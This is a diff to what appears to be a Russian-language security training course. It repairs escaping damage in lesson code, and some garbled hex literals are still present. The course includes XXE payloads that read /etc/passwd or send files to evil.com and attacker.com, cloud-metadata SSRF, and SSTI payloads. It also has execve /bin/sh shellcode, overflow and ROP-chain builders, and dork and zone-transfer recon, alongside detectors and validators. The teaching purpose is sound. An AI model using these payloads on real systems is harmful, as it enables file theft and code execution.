@@ -471,22 +471,22 @@ def point_add(P, Q, a, p):
         return Q
     if Q is None:
         return P
-    \x1, y1 = P
-    \x2, y2 = Q
+    x1, y1 = P
+    x2, y2 = Q
 
-    if \x1 == \x2 and y1 != y2:
+    if x1 == x2 and y1 != y2:
         return None  # точка на бесконечности
 
     if P == Q:
-        # Удвоение: lambda = (3*\x1² + a) / (2*y1) mod p
-        lam = (3 * \x1 * \x1 + a) * pow(2 * y1, -1, p) % p
+        # Удвоение: lambda = (3*x1² + a) / (2*y1) mod p
+        lam = (3 * x1 * x1 + a) * pow(2 * y1, -1, p) % p
     else:
-        # Сложение: lambda = (y2 - y1) / (\x2 - \x1) mod p
-        lam = (y2 - y1) * pow(\x2 - \x1, -1, p) % p
+        # Сложение: lambda = (y2 - y1) / (x2 - x1) mod p
+        lam = (y2 - y1) * pow(x2 - x1, -1, p) % p
 
-    \x3 = (lam * lam - \x1 - \x2) % p
-    y3 = (lam * (\x1 - \x3) - y1) % p
-    return (\x3, y3)
+    x3 = (lam * lam - x1 - x2) % p
+    y3 = (lam * (x1 - x3) - y1) % p
+    return (x3, y3)
 
 def scalar_mult(k, P, a, p):
     """Скалярное умножение: k * P методом double-and-add."""
@@ -558,9 +558,9 @@ assert secret_A == secret_B  # Общий секрет совпадает!
     duration: 60,
     assignment: {
       title: 'Операции на эллиптической кривой',
-      description: 'Реализуйте сложение точек и скалярное умножение на эллиптической кривой y² = x³ + ax + b mod p. На вход: a, p (через пробел), затем команда: "add \x1 y1 \x2 y2" или "mul k x y". Для точки на бесконечности выведите "INF". Иначе выведите x y через пробел.',
+      description: 'Реализуйте сложение точек и скалярное умножение на эллиптической кривой y² = x³ + ax + b mod p. На вход: a, p (через пробел), затем команда: "add x1 y1 x2 y2" или "mul k x y". Для точки на бесконечности выведите "INF". Иначе выведите x y через пробел.',
       difficulty: 'hard' as const,
-      starterCode: 'def point_add(P, Q, a, p):\n    pass\n\ndef scalar_mult(k, P, a, p):\n    pass\n\na, p = map(int, input().split())\ncmd = input().split()\nif cmd[0] == "add":\n    \x1, y1, \x2, y2 = int(cmd[1]), int(cmd[2]), int(cmd[3]), int(cmd[4])\n    r = point_add((\x1,y1), (\x2,y2), a, p)\n    print("INF" if r is None else f"{r[0]} {r[1]}")\nelse:\n    k, x, y = int(cmd[1]), int(cmd[2]), int(cmd[3])\n    r = scalar_mult(k, (x,y), a, p)\n    print("INF" if r is None else f"{r[0]} {r[1]}")\n',
+      starterCode: 'def point_add(P, Q, a, p):\n    pass\n\ndef scalar_mult(k, P, a, p):\n    pass\n\na, p = map(int, input().split())\ncmd = input().split()\nif cmd[0] == "add":\n    x1, y1, x2, y2 = int(cmd[1]), int(cmd[2]), int(cmd[3]), int(cmd[4])\n    r = point_add((x1,y1), (x2,y2), a, p)\n    print("INF" if r is None else f"{r[0]} {r[1]}")\nelse:\n    k, x, y = int(cmd[1]), int(cmd[2]), int(cmd[3])\n    r = scalar_mult(k, (x,y), a, p)\n    print("INF" if r is None else f"{r[0]} {r[1]}")\n',
       testCases: [
         { input: '2 97\nadd 3 6 3 6', expectedOutput: '80 10', description: 'Удвоение точки (3,6) на кривой y²=x³+2x+b mod 97' },
         { input: '2 97\nmul 7 3 6', expectedOutput: '82 6', description: '7*(3,6) на кривой y²=x³+2x+b mod 97' },
@@ -647,7 +647,7 @@ def birthday_attack(hash_func, hash_bits, prefix_bits=None):
 
     while True:
         msg = random.randbytes(16)
-        h = int(hash_func(msg).he\xdigest(), 16) & mask
+        h = int(hash_func(msg).hexdigest(), 16) & mask
         attempts += 1
 
         if h in seen and seen[h] != msg:
@@ -919,7 +919,7 @@ def generate_csrf_token(session_id: str, secret: str) -> str:
     """Генерирует CSRF-токен, привязанный к сессии."""
     return hmac.new(
         secret.encode(), session_id.encode(), 'sha256'
-    ).he\xdigest()
+    ).hexdigest()
 
 def verify_csrf_token(token: str, session_id: str, secret: str) -> bool:
     """Проверяет CSRF-токен."""
@@ -984,7 +984,7 @@ def is_safe_url(url: str) -> bool:
         addr = ipaddress.ip_address(ip)
         return not (addr.is_private or addr.is_loopback
                     or addr.is_link_local or addr.is_reserved)
-    e\xcept (socket.gaierror, ValueError):
+    except (socket.gaierror, ValueError):
         return False
 \`\`\`
 
@@ -1000,9 +1000,9 @@ def is_safe_url(url: str) -> bool:
       difficulty: 'hard' as const,
       starterCode: 'def is_ssrf_safe(url: str) -> bool:\n    # Верните True если URL безопасен, False если SSRF\n    pass\n\nn = int(input())\nfor _ in range(n):\n    url = input().strip()\n    print("SAFE" if is_ssrf_safe(url) else "BLOCKED")\n',
       testCases: [
-        { input: '4\nhttps://google.com/api\nhttp://127.0.0.1/admin\nhttp://192.168.1.1:8080/secret\nftp://e\xample.com/file', expectedOutput: 'SAFE\nBLOCKED\nBLOCKED\nBLOCKED', description: 'Внешний HTTPS — ok, localhost — blocked, приватный IP — blocked, ftp — blocked' },
+        { input: '4\nhttps://google.com/api\nhttp://127.0.0.1/admin\nhttp://192.168.1.1:8080/secret\nftp://example.com/file', expectedOutput: 'SAFE\nBLOCKED\nBLOCKED\nBLOCKED', description: 'Внешний HTTPS — ok, localhost — blocked, приватный IP — blocked, ftp — blocked' },
         { input: '3\nhttp://10.0.0.1/metadata\nhttp://evil.com@127.0.0.1/admin\nhttp://172.16.0.1/', expectedOutput: 'BLOCKED\nBLOCKED\nBLOCKED', description: 'Приватный 10.x, @ в URL, приватный 172.16.x' },
-        { input: '3\nhttps://api.e\xample.com/data\nhttp://8.8.8.8/dns\nhttp://localhost/internal', expectedOutput: 'SAFE\nSAFE\nBLOCKED', description: 'Внешние адреса safe, localhost blocked' },
+        { input: '3\nhttps://api.example.com/data\nhttp://8.8.8.8/dns\nhttp://localhost/internal', expectedOutput: 'SAFE\nSAFE\nBLOCKED', description: 'Внешние адреса safe, localhost blocked' },
       ],
       points: 18,
     },
@@ -1012,7 +1012,7 @@ def is_safe_url(url: str) -> bool:
   // УРОК 8: XXE-атаки
   // ──────────────────────────────────────────
   {
-    slug: 'x\xe-attacks',
+    slug: 'xxe-attacks',
     title: 'XXE-атаки',
     description: 'Внедрение XML-сущностей, чтение файлов сервера, SSRF через XXE, Blind XXE',
     content: `# XXE — XML External Entity Injection
@@ -1034,8 +1034,8 @@ XML поддерживает **сущности** — переменные, ко
 **Внешние сущности** загружают данные из URI:
 
 \`\`\`xml
-<!ENTITY x\xe SYSTEM "file:///etc/passwd">
-<!ENTITY x\xe SYSTEM "http://evil.com/steal">
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+<!ENTITY xxe SYSTEM "http://evil.com/steal">
 \`\`\`
 
 ## Классическая XXE: чтение файлов
@@ -1043,10 +1043,10 @@ XML поддерживает **сущности** — переменные, ко
 \`\`\`xml
 <?xml version="1.0"?>
 <!DOCTYPE foo [
-  <!ENTITY x\xe SYSTEM "file:///etc/passwd">
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
 ]>
 <stockCheck>
-  <productId>&x\xe;</productId>
+  <productId>&xxe;</productId>
 </stockCheck>
 \`\`\`
 
@@ -1056,7 +1056,7 @@ XML поддерживает **сущности** — переменные, ко
 
 \`\`\`xml
 <!DOCTYPE foo [
-  <!ENTITY x\xe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
+  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
 ]>
 \`\`\`
 
@@ -1074,7 +1074,7 @@ XML поддерживает **сущности** — переменные, ко
 
 Файл \`evil.dtd\` на сервере атакующего:
 \`\`\`xml
-<!ENTITY % all "<!ENTITY &#\x25; send SYSTEM 'http://evil.com/?data=%file;'>">
+<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://evil.com/?data=%file;'>">
 %all;
 %send;
 \`\`\`
@@ -1082,17 +1082,17 @@ XML поддерживает **сущности** — переменные, ко
 ## Генерация XXE-пэйлоадов на Python
 
 \`\`\`python
-def generate_x\xe_payload(file_path: str, tag: str = "data") -> str:
+def generate_xxe_payload(file_path: str, tag: str = "data") -> str:
     """Генерирует XML-пэйлоад для чтения файла через XXE."""
     return f"""<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
-  <!ENTITY x\xe SYSTEM "file://{file_path}">
+  <!ENTITY xxe SYSTEM "file://{file_path}">
 ]>
 <root>
-  <{tag}>&x\xe;</{tag}>
+  <{tag}>&xxe;</{tag}>
 </root>"""
 
-def generate_blind_x\xe(callback_url: str, file_path: str) -> tuple:
+def generate_blind_xxe(callback_url: str, file_path: str) -> tuple:
     """Генерирует Blind XXE payload + DTD файл."""
     xml_payload = f"""<?xml version="1.0"?>
 <!DOCTYPE foo [
@@ -1102,7 +1102,7 @@ def generate_blind_x\xe(callback_url: str, file_path: str) -> tuple:
 ]>
 <root>test</root>"""
 
-    dtd_content = f"""<!ENTITY % all "<!ENTITY &#\x25; send SYSTEM
+    dtd_content = f"""<!ENTITY % all "<!ENTITY &#x25; send SYSTEM
   '{callback_url}/?data=%file;'>">
 %all;
 %send;"""
@@ -1110,14 +1110,14 @@ def generate_blind_x\xe(callback_url: str, file_path: str) -> tuple:
     return xml_payload, dtd_content
 
 # Примеры
-print(generate_x\xe_payload("/etc/passwd"))
-payload, dtd = generate_blind_x\xe("http://attacker.com", "/etc/shadow")
+print(generate_xxe_payload("/etc/passwd"))
+payload, dtd = generate_blind_xxe("http://attacker.com", "/etc/shadow")
 \`\`\`
 
 ## Обнаружение XXE
 
 \`\`\`python
-def detect_x\xe_in_xml(xml_string: str) -> dict:
+def detect_xxe_in_xml(xml_string: str) -> dict:
     """Анализирует XML на наличие признаков XXE."""
     indicators = {
         "has_doctype": "<!DOCTYPE" in xml_string.upper(),
@@ -1165,11 +1165,11 @@ import xml.etree.ElementTree as ET
       title: 'Детектор XXE-паттернов в XML',
       description: 'Реализуйте анализатор XML-строки на признаки XXE. На вход: многострочная XML-строка (до маркера END). Выведите по одному признаку на строку: DOCTYPE:YES/NO, ENTITY:YES/NO, SYSTEM:YES/NO, FILE_PROTO:YES/NO, HTTP_ENTITY:YES/NO. Затем строку RISK:N, где N — количество YES.',
       difficulty: 'medium' as const,
-      starterCode: 'import sys\n\ndef analyze_x\xe(xml_str: str) -> dict:\n    pass\n\nlines = []\nfor line in sys.stdin:\n    line = line.rstrip()\n    if line == "END":\n        break\n    lines.append(line)\nxml = "\\n".join(lines)\nresult = analyze_x\xe(xml)\nfor key in ["DOCTYPE", "ENTITY", "SYSTEM", "FILE_PROTO", "HTTP_ENTITY"]:\n    print(f"{key}:{\"YES\" if result[key] else \"NO\"}")\nprint(f"RISK:{sum(1 for v in result.values() if v)}")\n',
+      starterCode: 'import sys\n\ndef analyze_xxe(xml_str: str) -> dict:\n    pass\n\nlines = []\nfor line in sys.stdin:\n    line = line.rstrip()\n    if line == "END":\n        break\n    lines.append(line)\nxml = "\\n".join(lines)\nresult = analyze_xxe(xml)\nfor key in ["DOCTYPE", "ENTITY", "SYSTEM", "FILE_PROTO", "HTTP_ENTITY"]:\n    print(f"{key}:{\"YES\" if result[key] else \"NO\"}")\nprint(f"RISK:{sum(1 for v in result.values() if v)}")\n',
       testCases: [
-        { input: '<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY x\xe SYSTEM "file:///etc/passwd">\n]>\n<root>&x\xe;</root>\nEND', expectedOutput: 'DOCTYPE:YES\nENTITY:YES\nSYSTEM:YES\nFILE_PROTO:YES\nHTTP_ENTITY:NO\nRISK:4', description: 'Классическая XXE с file:// — 4 признака' },
+        { input: '<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<root>&xxe;</root>\nEND', expectedOutput: 'DOCTYPE:YES\nENTITY:YES\nSYSTEM:YES\nFILE_PROTO:YES\nHTTP_ENTITY:NO\nRISK:4', description: 'Классическая XXE с file:// — 4 признака' },
         { input: '<root><data>hello</data></root>\nEND', expectedOutput: 'DOCTYPE:NO\nENTITY:NO\nSYSTEM:NO\nFILE_PROTO:NO\nHTTP_ENTITY:NO\nRISK:0', description: 'Обычный XML без XXE — 0 признаков' },
-        { input: '<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY x\xe SYSTEM "http://evil.com/data">\n]>\n<r>&x\xe;</r>\nEND', expectedOutput: 'DOCTYPE:YES\nENTITY:YES\nSYSTEM:YES\nFILE_PROTO:NO\nHTTP_ENTITY:YES\nRISK:4', description: 'XXE с HTTP callback — 4 признака (включая HTTP_ENTITY)' },
+        { input: '<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "http://evil.com/data">\n]>\n<r>&xxe;</r>\nEND', expectedOutput: 'DOCTYPE:YES\nENTITY:YES\nSYSTEM:YES\nFILE_PROTO:NO\nHTTP_ENTITY:YES\nRISK:4', description: 'XXE с HTTP callback — 4 признака (включая HTTP_ENTITY)' },
       ],
       points: 15,
     },
@@ -1304,7 +1304,7 @@ def generate_sandbox_bypasses(blocked_keywords: list) -> list:
 ## Защита от SSTI
 
 1. **Никогда не вставлять пользовательский ввод в шаблон** — только в данные
-2. Использовать **песочницу** Jinja2: \`Sandbo\xedEnvironment\`
+2. Использовать **песочницу** Jinja2: \`SandboxedEnvironment\`
 3. **Логика-less шаблоны** (Mustache, Handlebars) — менее мощные, но безопаснее
 4. **CSP** и другие заголовки безопасности
 
@@ -1321,7 +1321,7 @@ def generate_sandbox_bypasses(blocked_keywords: list) -> list:
       starterCode: 'def classify_ssti(payload: str) -> str:\n    pass\n\nn = int(input())\nfor _ in range(n):\n    print(classify_ssti(input().strip()))\n',
       testCases: [
         { input: '4\n{{ \'\'.__class__.__mro__[1].__subclasses__() }}\n${7*7}\n<%= system("id") %>\nHello World', expectedOutput: 'JINJA2\nFREEMARKER\nERB\nSAFE', description: 'По одному примеру каждого типа' },
-        { input: '3\n{{ config.__class__.__init__.__globals__ }}\n{{ _self.env.registerUndefinedFilterCallback("e\xec") }}\n<#assign ex="freemarker.template.utility.E\xecute"?new()>', expectedOutput: 'JINJA2\nTWIG\nFREEMARKER', description: 'Jinja2 через globals, Twig через _self, Freemarker через #assign' },
+        { input: '3\n{{ config.__class__.__init__.__globals__ }}\n{{ _self.env.registerUndefinedFilterCallback("exec") }}\n<#assign ex="freemarker.template.utility.Execute"?new()>', expectedOutput: 'JINJA2\nTWIG\nFREEMARKER', description: 'Jinja2 через globals, Twig через _self, Freemarker через #assign' },
         { input: '2\n{{7*7}}\n{{ [].__class__.__base__.__subclasses__() }}', expectedOutput: 'SAFE\nJINJA2', description: '{{7*7}} без маркеров — SAFE, второй — JINJA2 через __class__' },
       ],
       points: 18,
@@ -1463,7 +1463,7 @@ def detect_unsafe_deserialization(code: str) -> list:
         (r'yaml\.load\((?!.*safe)', "yaml.load() без safe — возможен RCE"),
         (r'yaml\.load\(.*Loader=yaml\.Loader', "yaml.load(Loader=Loader) — небезопасен"),
         (r'eval\(', "eval() — выполнение произвольного кода"),
-        (r'e\xec\(', "e\xec() — выполнение произвольного кода"),
+        (r'exec\(', "exec() — выполнение произвольного кода"),
         (r'__import__\(', "__import__() — динамический импорт"),
         (r'marshal\.loads?\(', "marshal.loads() — небезопасен"),
         (r'shelve\.open\(', "shelve — использует pickle внутри"),
@@ -1490,13 +1490,13 @@ def detect_unsafe_deserialization(code: str) -> list:
     duration: 55,
     assignment: {
       title: 'Сканер небезопасной десериализации',
-      description: 'Реализуйте сканер Python-кода на небезопасные паттерны десериализации. На вход: многострочный Python-код (до маркера END). Проверьте наличие паттернов: PICKLE (pickle.loads или pickle.load), YAML (yaml.load без safe_load), EVAL (eval()), EXEC (e\xec()), MARSHAL (marshal.loads или marshal.load). Выведите найденные паттерны по одному на строку в порядке: PICKLE, YAML, EVAL, EXEC, MARSHAL. Если ничего не найдено — выведите SAFE.',
+      description: 'Реализуйте сканер Python-кода на небезопасные паттерны десериализации. На вход: многострочный Python-код (до маркера END). Проверьте наличие паттернов: PICKLE (pickle.loads или pickle.load), YAML (yaml.load без safe_load), EVAL (eval()), EXEC (exec()), MARSHAL (marshal.loads или marshal.load). Выведите найденные паттерны по одному на строку в порядке: PICKLE, YAML, EVAL, EXEC, MARSHAL. Если ничего не найдено — выведите SAFE.',
       difficulty: 'hard' as const,
       starterCode: 'import sys\nimport re\n\ndef scan_deserialization(code: str) -> list:\n    pass\n\nlines = []\nfor line in sys.stdin:\n    line = line.rstrip()\n    if line == "END":\n        break\n    lines.append(line)\ncode = "\\n".join(lines)\nresult = scan_deserialization(code)\nif result:\n    for r in result:\n        print(r)\nelse:\n    print("SAFE")\n',
       testCases: [
         { input: 'import pickle\ndata = pickle.loads(user_input)\nresult = eval(data["expr"])\nEND', expectedOutput: 'PICKLE\nEVAL', description: 'pickle.loads и eval найдены' },
         { input: 'import json\ndata = json.loads(request.body)\nprint(data)\nEND', expectedOutput: 'SAFE', description: 'json.loads безопасен — SAFE' },
-        { input: 'import yaml\nimport marshal\nconfig = yaml.load(open("conf.yml"), Loader=yaml.Loader)\ncache = marshal.loads(data)\ne\xec(config["code"])\nEND', expectedOutput: 'YAML\nEXEC\nMARSHAL', description: 'yaml.load (не safe), marshal.loads и e\xec' },
+        { input: 'import yaml\nimport marshal\nconfig = yaml.load(open("conf.yml"), Loader=yaml.Loader)\ncache = marshal.loads(data)\nexec(config["code"])\nEND', expectedOutput: 'YAML\nEXEC\nMARSHAL', description: 'yaml.load (не safe), marshal.loads и exec' },
       ],
       points: 18,
     },
@@ -1617,7 +1617,7 @@ def create_exploit_payload(buffer_size: int, nop_size: int,
     payload += struct.pack("<I", ret_addr)  # return address → NOP sled
     return payload
 
-# Пример Linux \x86 shellcode для /bin/sh (21 байт)
+# Пример Linux x86 shellcode для /bin/sh (21 байт)
 shellcode_binsh = (
     b"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68"
     b"\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50"
@@ -1818,7 +1818,7 @@ def got_overwrite_plan(got_entry: int, target_func: int) -> dict:
         "description": f"Перезапись GOT[{hex(got_entry)}] на {hex(target_func)}",
         "effect": "При следующем вызове исходной функции выполнится target",
         "payload_info": calculate_format_write(got_entry, target_func),
-        "e\xample": f"printf@GOT = {hex(got_entry)} -> system@PLT = {hex(target_func)}",
+        "example": f"printf@GOT = {hex(got_entry)} -> system@PLT = {hex(target_func)}",
     }
 
 # Пример: перезаписываем printf@GOT на system
@@ -1851,7 +1851,7 @@ plan = got_overwrite_plan(0\x0804a010, 0\x08041060)
       testCases: [
         { input: '%x.%x.%x\n255 4096 31337', expectedOutput: 'ff.1000.7a69', description: '%x выводит hex без ведущих нулей' },
         { input: 'addr=%3$p val=%1$d\n100 200 48879', expectedOutput: 'addr=0\xbeef val=100', description: 'Прямой доступ: %3$p=третий(48879=0\xbeef), %1$d=первый(100)' },
-        { input: 'A%\xB%\xC\n10 255', expectedOutput: 'AaB ffC', description: 'Обычные символы между спецификаторами сохраняются' },
+        { input: 'A%xB%xC\n10 255', expectedOutput: 'AaB ffC', description: 'Обычные символы между спецификаторами сохраняются' },
         { input: '%d+%d=%d\n3 5 8', expectedOutput: '3+5=8', description: 'Десятичный вывод' },
       ],
       points: 20,
@@ -1894,7 +1894,7 @@ plan = got_overwrite_plan(0\x0804a010, 0\x08041060)
 
 \`\`\`
 ┌──────────────────┐
-│ addr(gadget_1)    │ → pop eax; ret  → eax = 0\x0b (e\xecve)
+│ addr(gadget_1)    │ → pop eax; ret  → eax = 0\x0b (execve)
 ├──────────────────┤
 │ 0\x0000000b        │ (значение для eax)
 ├──────────────────┤
@@ -1902,7 +1902,7 @@ plan = got_overwrite_plan(0\x0804a010, 0\x08041060)
 ├──────────────────┤
 │ addr("/bin/sh")   │ (значение для ebx)
 ├──────────────────┤
-│ addr(gadget_3)    │ → int 0\x80       → системный вызов e\xecve
+│ addr(gadget_3)    │ → int 0\x80       → системный вызов execve
 └──────────────────┘
 \`\`\`
 
@@ -1914,11 +1914,11 @@ import struct
 class ROPChain:
     """Конструктор ROP-цепочки."""
 
-    def __init__(self, arch="\x86"):
+    def __init__(self, arch="x86"):
         self.chain = []
         self.arch = arch
-        self.pack_fmt = "<I" if arch == "\x86" else "<Q"
-        self.word_size = 4 if arch == "\x86" else 8
+        self.pack_fmt = "<I" if arch == "x86" else "<Q"
+        self.word_size = 4 if arch == "x86" else 8
 
     def add_gadget(self, addr: int, *args):
         """Добавляет гаджет с аргументами."""
@@ -1962,9 +1962,9 @@ class ROPChain:
                 offset += self.word_size
         return "\n".join(lines)
 
-# Пример: e\xecve("/bin/sh", NULL, NULL) на \x86 Linux
-rop = ROPChain("\x86")
-rop.add_gadget(0\x08041234, 0\x0b)        # pop eax; ret → eax = 11 (e\xecve)
+# Пример: execve("/bin/sh", NULL, NULL) на x86 Linux
+rop = ROPChain("x86")
+rop.add_gadget(0\x08041234, 0\x0b)        # pop eax; ret → eax = 11 (execve)
 rop.add_gadget(0\x08041238, 0\x0804b000)  # pop ebx; ret → ebx = "/bin/sh"
 rop.add_gadget(0\x0804123c, 0\x00000000)  # pop ecx; ret → ecx = NULL
 rop.add_gadget(0\x08041240, 0\x00000000)  # pop edx; ret → edx = NULL
@@ -2036,13 +2036,13 @@ def ret2libc_payload(system_addr, exit_addr, binsh_addr, offset):
     duration: 60,
     assignment: {
       title: 'Построение ROP-цепочки',
-      description: 'Реализуйте конструктор ROP-цепочки. На вход: первая строка — архитектура (\x86 или \x64), затем N строк с командами: "gadget ADDR [ARG1 ARG2 ...]" или "value VAL" или "padding SIZE". Все числа в hex (без 0x). Выведите итоговый payload в hex (lowercase, без пробелов). \x86 = 4 байта little-endian, \x64 = 8 байт.',
+      description: 'Реализуйте конструктор ROP-цепочки. На вход: первая строка — архитектура (x86 или x64), затем N строк с командами: "gadget ADDR [ARG1 ARG2 ...]" или "value VAL" или "padding SIZE". Все числа в hex (без 0x). Выведите итоговый payload в hex (lowercase, без пробелов). x86 = 4 байта little-endian, x64 = 8 байт.',
       difficulty: 'hard' as const,
-      starterCode: 'import struct\n\ndef build_rop(arch: str, commands: list) -> str:\n    pass\n\narch = input().strip()\ncmds = []\nwhile True:\n    try:\n        line = input().strip()\n        if line:\n            cmds.append(line)\n    e\xcept EOFError:\n        break\nprint(build_rop(arch, cmds))\n',
+      starterCode: 'import struct\n\ndef build_rop(arch: str, commands: list) -> str:\n    pass\n\narch = input().strip()\ncmds = []\nwhile True:\n    try:\n        line = input().strip()\n        if line:\n            cmds.append(line)\n    except EOFError:\n        break\nprint(build_rop(arch, cmds))\n',
       testCases: [
-        { input: '\x86\ngadget 08041234 0b\ngadget 08041238 0804b000', expectedOutput: '341204080b000000381204080000b00408', description: '\x86: два гаджета с аргументами, little-endian 4 байта' },
-        { input: '\x86\npadding 4\nvalue deadbeef', expectedOutput: '41414141efbeadde', description: 'padding AAAA + value 0\xdeadbeef' },
-        { input: '\x64\ngadget 00400123 0b', expectedOutput: '230140000000000000b000000000000000', description: '\x64: гаджет + аргумент, 8 байт little-endian' },
+        { input: 'x86\ngadget 08041234 0b\ngadget 08041238 0804b000', expectedOutput: '341204080b000000381204080000b00408', description: 'x86: два гаджета с аргументами, little-endian 4 байта' },
+        { input: 'x86\npadding 4\nvalue deadbeef', expectedOutput: '41414141efbeadde', description: 'padding AAAA + value 0\xdeadbeef' },
+        { input: 'x64\ngadget 00400123 0b', expectedOutput: '230140000000000000b000000000000000', description: 'x64: гаджет + аргумент, 8 байт little-endian' },
       ],
       points: 20,
     },
@@ -2061,7 +2061,7 @@ def ret2libc_payload(system_addr, exit_addr, binsh_addr, offset):
 
 **Shellcode** — машинный код, выполняющий нужное действие (обычно запуск shell). Внедряется через уязвимость (buffer overflow, format string).
 
-## Системные вызовы Linux \x86
+## Системные вызовы Linux x86
 
 Для вызова ядра Linux:
 1. Номер syscall → \`eax\`
@@ -2073,12 +2073,12 @@ def ret2libc_payload(system_addr, exit_addr, binsh_addr, offset):
 | exit | 1 | Завершение |
 | read | 3 | Чтение |
 | write | 4 | Запись |
-| e\xecve | 11 | Запуск программы |
+| execve | 11 | Запуск программы |
 
-## Простой shellcode: e\xecve("/bin/sh")
+## Простой shellcode: execve("/bin/sh")
 
 \`\`\`asm
-; e\xecve("/bin/sh", NULL, NULL)
+; execve("/bin/sh", NULL, NULL)
 xor eax, eax       ; eax = 0
 push eax            ; NULL terminator
 push 0\x68732f2f     ; "//sh"
@@ -2087,7 +2087,7 @@ mov ebx, esp        ; ebx = pointer to "/bin//sh"
 push eax            ; NULL
 mov ecx, esp        ; ecx = NULL
 xor edx, edx        ; edx = NULL
-mov al, 0\x0b        ; syscall e\xecve = 11
+mov al, 0\x0b        ; syscall execve = 11
 int 0\x80            ; вызов ядра
 \`\`\`
 
@@ -2117,7 +2117,7 @@ def assemble_to_hex(asm_description: list) -> bytes:
             shellcode += opcodes[instr]
     return shellcode
 
-# e\xecve("/bin/sh") shellcode
+# execve("/bin/sh") shellcode
 shellcode = assemble_to_hex([
     "xor eax, eax", "push eax",
     "push 0\x68732f2f", "push 0\x6e69622f",
@@ -2360,7 +2360,7 @@ def extract_http_data(tcp_payload: bytes) -> dict:
     """Извлекает данные из HTTP запроса/ответа."""
     try:
         text = tcp_payload.decode('utf-8', errors='replace')
-    e\xcept E\xception:
+    except Exception:
         return {"type": "binary", "size": len(tcp_payload)}
 
     lines = text.split('\r\n')
@@ -2400,7 +2400,7 @@ def extract_http_data(tcp_payload: bytes) -> dict:
 
 1. **Извлечение файлов** — пересылка через HTTP/FTP
 2. **Поиск паролей** — HTTP Basic Auth, FTP, Telnet (открытый текст)
-3. **DNS e\xfiltration** — данные в DNS-запросах
+3. **DNS exfiltration** — данные в DNS-запросах
 4. **Wireshark Follow TCP Stream** — восстановление сессий
 5. **USB PCAP** — перехват клавиатурных нажатий
 
@@ -2455,7 +2455,7 @@ def extract_http_data(tcp_payload: bytes) -> dict:
 | \`inurl:\` | В URL | \`inurl:admin/login\` |
 | \`intitle:\` | В заголовке | \`intitle:"index of" /backup\` |
 | \`intext:\` | В тексте | \`intext:"password" filetype:log\` |
-| \`cache:\` | Кэш Google | \`cache:e\xample.com\` |
+| \`cache:\` | Кэш Google | \`cache:example.com\` |
 | \`""\` | Точная фраза | \`"error connecting to database"\` |
 
 \`\`\`python
@@ -2482,7 +2482,7 @@ def generate_google_dorks(domain: str, keywords: list = None) -> list:
     return dorks
 
 # Пример
-for dork in generate_google_dorks("e\xample.com", ["api_key", "secret"]):
+for dork in generate_google_dorks("example.com", ["api_key", "secret"]):
     print(dork)
 \`\`\`
 
@@ -2500,7 +2500,7 @@ def dns_recon_queries(domain: str) -> dict:
     return {
         "record_queries": {rt: f"dig {domain} {rt}" for rt in record_types},
         "subdomain_brute": [f"{sub}.{domain}" for sub in subdomains],
-        "zone_transfer": f"dig a\xfr @ns1.{domain} {domain}",
+        "zone_transfer": f"dig axfr @ns1.{domain} {domain}",
         "reverse_dns": "dig -x <IP>",
     }
 \`\`\`
@@ -2607,7 +2607,7 @@ def osint_report(domain: str) -> dict:
       difficulty: 'medium' as const,
       starterCode: 'def generate_dorks(domain: str, types: list) -> list:\n    pass\n\ndomain = input().strip()\ntypes = input().split()\nfor dork in generate_dorks(domain, types):\n    print(dork)\n',
       testCases: [
-        { input: 'e\xample.com\nfiles admin', expectedOutput: 'site:e\xample.com filetype:pdf OR filetype:xlsx OR filetype:doc\nsite:e\xample.com inurl:admin OR inurl:login', description: 'Два типа: files и admin' },
+        { input: 'example.com\nfiles admin', expectedOutput: 'site:example.com filetype:pdf OR filetype:xlsx OR filetype:doc\nsite:example.com inurl:admin OR inurl:login', description: 'Два типа: files и admin' },
         { input: 'target.ru\nsensitive backup', expectedOutput: 'site:target.ru intext:password OR intext:secret OR intext:api_key\nsite:target.ru filetype:bak OR filetype:sql OR filetype:old', description: 'sensitive и backup для .ru домена' },
         { input: 'corp.org\nfiles admin sensitive backup', expectedOutput: 'site:corp.org filetype:pdf OR filetype:xlsx OR filetype:doc\nsite:corp.org inurl:admin OR inurl:login\nsite:corp.org intext:password OR intext:secret OR intext:api_key\nsite:corp.org filetype:bak OR filetype:sql OR filetype:old', description: 'Все 4 типа' },
       ],
@@ -2956,7 +2956,7 @@ def get_category_checklist(category: str) -> list:
             "strings <file> | grep -i flag",
             "binwalk <file> — встроенные файлы",
             "exiftool <file> — метаданные",
-            "x\xd <file> | head — hex-дамп",
+            "xxd <file> | head — hex-дамп",
             "steghide/stegsolve для изображений",
         ],
         "pwn": [
@@ -3035,16 +3035,16 @@ def identify_rabbit_holes(observations: list) -> list:
 Информация скрыта в младших битах пикселей изображения:
 
 \`\`\`python
-def extract_lsb(pi\xels: list, num_bits: int = 1) -> str:
+def extract_lsb(pixels: list, num_bits: int = 1) -> str:
     """
     Извлекает данные из LSB пикселей.
-    pi\xels: список значений байтов (R, G, B, R, G, B, ...)
+    pixels: список значений байтов (R, G, B, R, G, B, ...)
     """
     bits = ""
-    for pi\xel_val in pi\xels:
+    for pixel_val in pixels:
         # Извлекаем num_bits младших бит
         for bit_pos in range(num_bits):
-            bits += str((pi\xel_val >> bit_pos) & 1)
+            bits += str((pixel_val >> bit_pos) & 1)
 
     # Конвертируем биты в байты
     result = ""
@@ -3056,9 +3056,9 @@ def extract_lsb(pi\xels: list, num_bits: int = 1) -> str:
     return result
 
 # Пример: извлечение из RGB значений
-pi\xels = [0b11001100, 0b10101011, 0b01010101,  # R, G, B первого пикселя
+pixels = [0b11001100, 0b10101011, 0b01010101,  # R, G, B первого пикселя
           0b11110001, 0b00001100, 0b10101010]
-hidden = extract_lsb(pi\xels)
+hidden = extract_lsb(pixels)
